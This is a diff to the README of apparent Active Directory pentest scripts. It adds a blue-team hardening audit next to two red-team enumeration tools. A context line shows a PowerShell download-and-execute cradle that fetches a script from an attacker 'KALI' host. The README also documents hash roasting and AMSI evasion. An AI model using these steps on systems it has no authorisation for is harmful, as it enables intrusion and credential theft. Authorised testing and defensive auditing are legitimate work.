@@ -1,19 +1,24 @@
 # ad-enum
 
-Two complementary **Active Directory enumeration** scripts for Active Directory engagements. 
-Both are **enumeration-only**. Every command is one you would type by hand —
-the scripts just chain them, save each output to its own file, and finish with a
-ranked summary of what was found and what to do next.
+Active Directory scripts for AD engagements — two **red-team enumeration**
+scripts and one **blue-team hardening audit**. The enumeration scripts are
+*enumeration-only*: every command is one you would type by hand, chained, with
+each output saved to its own file and a ranked summary of what was found and
+what to do next. The audit script is the defensive counterpart: same attack
+surface, read-only, with a concrete **remediation** for every weakness.
 
-| Script       | Where it runs            | Needs credentials?                         | Tooling |
-|--------------|--------------------------|--------------------------------------------|---------|
-| `ad-enum.sh` | Kali (remote, over LDAP) | Yes — a domain user (password or NT hash)  | nxc / impacket / certipy / bloodhound-python |
-| `ade.ps1`    | On a domain-joined host  | No — reuses the current user's token        | Pure ADSI / .NET (AMSI-safe, nothing downloaded) |
+| Script          | Team | Where it runs            | Needs credentials?                        | Tooling |
+|-----------------|------|--------------------------|-------------------------------------------|---------|
+| `ad-enum.sh`    | red  | Kali (remote, over LDAP) | Yes — a domain user (password or NT hash) | nxc / impacket / certipy / bloodhound-python |
+| `ade.ps1`       | red  | On a domain-joined host  | No — reuses the current user's token       | Pure ADSI / .NET (AMSI-safe, nothing downloaded) |
+| `ad-audit.ps1`  | blue | On a domain-joined host  | Any read account (more with an auditor)   | Pure ADSI / .NET (read-only, no tickets requested) |
 
 Use `ad-enum.sh` when you already have a credential and are enumerating from
 Kali. 
 Use `ade.ps1` when you have a reverse shell as an unprivileged domain user
-but **no password**.
+but **no password**. 
+Use `ad-audit.ps1` as the defender: it inventories the same weaknesses the two
+enumeration scripts hunt for and tells you how to close each one.
 
 ## `ad-enum.sh` — from Kali
 
@@ -62,6 +67,42 @@ IEX(New-Object Net.WebClient).DownloadString('http://KALI/ade.ps1')
 | `-SkipAcl`  | skip the ACL scan (the slowest part) |
 | `-Roast`    | actively request TGS / AS-REP and dump crackable hashes |
 | `-Quiet`    | summary only, no per-check lines |
+
+## `ad-audit.ps1` — blue-team hardening audit (on a domain-joined host)
+
+The defensive mirror of the two enumeration scripts. Read-only, pure ADSI/.NET,
+**never requests a Kerberos ticket** (so it leaves no roast events) and never
+writes to the directory — safe to run in production. For every weakness it
+prints the offending objects and a `FIX:` line: the exact attribute to clear,
+GPO to set, or command to run.
+
+```powershell
+powershell -ep bypass -f ad-audit.ps1
+powershell -ep bypass -f ad-audit.ps1 -OutDir C:\Audit\ad
+powershell -ep bypass -f ad-audit.ps1 -Domain corp.com -StaleDays 60
+```
+
+| Parameter     | Meaning |
+|---------------|---------|
+| `-OutDir`     | output folder (one file per check + `SUMMARY.txt`) |
+| `-Domain`     | override the naming context, e.g. `corp.com` |
+| `-StaleDays`  | inactivity threshold for stale users/computers (default 90) |
+| `-KrbtgtDays` | flag the krbtgt password older than this (default 180) |
+| `-SkipAcl`    | skip the domain-wide DACL scan (DCSync / AdminSDHolder) |
+| `-Quiet`      | summary only, no per-check lines |
+
+What it checks (each with a remediation): password/lockout policy, reversible
+encryption, krbtgt age, AS-REP roastable and kerberoastable accounts, RC4-vs-AES
+on service accounts, unconstrained/constrained/RBCD delegation,
+`MachineAccountQuota`, non-default DCSync and AdminSDHolder rights, LAPS
+coverage, ADCS certificate templates vulnerable to ESC1, `PASSWD_NOTREQD`,
+password-never-expires, cleartext passwords in `description`, privileged-group
+membership, orphaned `adminCount`, Protected Users usage, stale users/computers,
+Guest account state, trusts (SID filtering), and domain functional level.
+
+Run it with a read-only auditor account for most checks; run it **on a DC** (or
+with an account that can read the relevant DACLs) to get the DCSync and
+AdminSDHolder findings. Re-run after each fix to confirm the finding clears.
 
 ## License
 
